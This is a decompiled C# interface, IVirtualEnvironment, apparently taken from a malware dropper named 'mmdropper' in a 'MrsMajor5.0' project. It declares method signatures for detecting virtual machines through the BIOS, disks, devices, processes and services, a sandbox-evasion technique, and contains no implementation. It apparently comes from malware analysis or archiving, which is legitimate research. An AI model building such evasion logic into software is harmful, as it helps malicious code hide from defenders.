// Decompiled with JetBrains decompiler
// Type: IVirtualEnvironment
// Assembly: mmdropper, Version=1.0.7321.42228, Culture=neutral, PublicKeyToken=null
// MVID: 67C14436-991D-42DC-A31E-001F369439CC
// Assembly location: C:\Users\victim\Documents\GitHub\MrsMajor5.0\decompiled\eulascr-StrDec.exe

using System.Collections.Generic;
using System.Runtime.CompilerServices;

#nullable disable
internal interface IVirtualEnvironment
{
  string Name { [MethodImpl(MethodImplOptions.NoInlining)] get; }

  [MethodImpl(MethodImplOptions.NoInlining)]
  bool IsVirtual(ComputerSystem computer);

  [MethodImpl(MethodImplOptions.NoInlining)]
  bool IsVirtual(BIOS bios);

  [MethodImpl(MethodImplOptions.NoInlining)]
  bool ContainsDisk(IEnumerable<DiskDrive> disks);

  [MethodImpl(MethodImplOptions.NoInlining)]
  bool ContainsDevice(IEnumerable<PnPEntity> devices);

  [MethodImpl(MethodImplOptions.NoInlining)]
  bool ContainsProcess(IEnumerable<string> processes);

  [MethodImpl(MethodImplOptions.NoInlining)]
  bool ContainsService(IEnumerable<WindowsService> services);

  [MethodImpl(MethodImplOptions.NoInlining)]
  bool Assert(
    ComputerSystem computer,
    BIOS bios,
    IEnumerable<DiskDrive> disks,
    IEnumerable<PnPEntity> devices,
    IEnumerable<string> processes,
    IEnumerable<WindowsService> services);
}
